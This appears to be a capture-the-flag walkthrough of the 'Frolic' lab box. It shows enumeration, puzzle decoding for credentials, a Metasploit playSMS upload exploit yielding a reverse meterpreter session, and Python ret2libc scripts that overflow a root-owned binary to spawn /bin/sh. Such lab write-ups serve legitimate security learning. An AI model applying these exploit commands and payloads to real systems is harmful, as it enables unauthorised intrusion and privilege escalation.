# Frolic
### Info:
OS: Linux<br>
IP: 10.10.10.111<br>
Difficulty : Medium<br>
### Enumeration:
```
nmap -sC -sV -oA nmap 10.10.10.111
``` 
gives us the results : <br>
![alt text](https://i.imgur.com/R7bQiUX.png) 
Running Gobuster on port 9999 gives us:
![alt text](https://i.imgur.com/Be8CuLQ.png)
Checking the source of admin we get
![alt text](https://i.imgur.com/zBqWvkJ.png)
Logging in we find `Esoteric Language ook` <br>
Decoding that language via  https://www.dcode.fr/ook-language we get `Nothing here check /asdiSIAJJ0QWE9JAS.` <br>
Going there we find base64 encoded text which on decoding and saving gives us a zip file.
![alt text](https://i.imgur.com/oosVrxV.png)
Bruteforcing and breaking the file we get :
![alt text](https://i.imgur.com/OUnN4JR.png)
Index.php contained : 
```
root@kali:~/Desktop/boxes/Frolic# cat index.php 
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```
Converting hex to ascii we get base64 and then we get brainfuck code from that. <br>
Decoding brainfuck code we get `idkwhatispass`
Enumerating another director /backup we find :
```
http://10.10.10.111:9999/backup/user.txt
user - admin
http://10.10.10.111:9999/backup/password.txt
password - imnothuman
```
On enumerating we find another subdirectory `http://10.10.10.111:9999/dev/backup/` <br> which contained the text /playsms.
### Exploitation:
On `http://10.10.10.111:9999/playsms`
Via searchsploit we get : 
![alt text](https://i.imgur.com/ySbGSVz.png)
Vulnerability Exploited: playsms_uploadcsv_exec
```
msf > use exploit/multi/http/playsms_uploadcsv_exec
msf exploit(multi/http/playsms_uploadcsv_exec) > set lhost 10.10.15.2
lhost => 10.10.15.2
msf exploit(multi/http/playsms_uploadcsv_exec) > set rhost 10.10.10.111
rhost => 10.10.10.111
msf exploit(multi/http/playsms_uploadcsv_exec) > set rport 9999
rport => 9999
msf exploit(multi/http/playsms_uploadcsv_exec) > set password idkwhatispass
password => idkwhatispass
msf exploit(multi/http/playsms_uploadcsv_exec) > set targeturi /playsms/
targeturi => /playsms/
msf exploit(multi/http/playsms_uploadcsv_exec) > run
```
and exploiting that service via metasploit as shown gives us the user. <br>
### Privilege Escalation:
We find a hidden folder inside `/home/ayush` and it contained a file named `rop` owned by root. <br>
Now we can download this file by simply using meterpreter `download file` command
Privilege Escalation Vulnerability: ROP exploit<br>
As NX was enabled we had to use Return Oriented Programming.
To test a pattern we used:
```
root@kali:~/Desktop/boxes/Frolic# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
and to get the offset we execute .rop in gdb and it comes out to be `0x62413762`  <br>
and to get the offset:
```
root@kali:~/Desktop/boxes/Frolic# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q  62413762
[*] Exact match at offset 52
```
Now we can get the system address as :
```
gef➤  p system
$1 = {<text variable, no debug info>} 0xf7e09980 <system>
```
/bin/sh address as :
```
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib32/libc-2.28.so'(0xf7f32000-0xf7fa2000), permission=r--
  0xf7f49aaa - 0xf7f49ab1  →   "/bin/sh" 
```
and exit_address can be anything. <br>
Adding everything gives us:
```
root@kali:~/Desktop/boxes/Frolic# cat practice.py
import struct
system_add = struct.pack("<I",0xf7e09980)
arg_add = struct.pack("<I",0xf7f49aaa) // /bin/sh 
exit_add = struct.pack("<I",0xd3adc0d3) //can be anything
buf = "A"*52
buf += system_add
buf += exit_add
buf += arg_add
print buf
```
Running this gives us the shell on our local, now performing this on the box. <br>
`ldd /home/ayush/.binary/rop | grep libc` gives us the location of libc <br>
`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system/exit/` provides us the offsets for the following. <br>
`strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh` gives us the /bin/sh offset. <br>
Adding up everything we get :
```
root@kali:~/Desktop/boxes/Frolic# cat bomb.py 
from subprocess import call
import struct
system_off=0x0003ada0
exit_off=0x0002e9d0 //not needed
arg_off = 0x0015ba0b
lib_c_add = 0xb7e19000
system_add = struct.pack("<I",lib_c_add+system_off)
arg_add = struct.pack("<I",lib_c_add+arg_off)
exit_add = struct.pack("<I",lib_c_add+exit_off)
buf = "A"*52
buf += system_add
buf += exit_add
buf += arg_add
print buf
```
Uploading this .py file via meterpreter upload command and running 
```
rop `python bomb.py`
``` 
gives us the shell.
<br>
### Gained knowledge:
Ook language <br>
Exploiting playsms <br>
Beating NX via ret2libc <br>
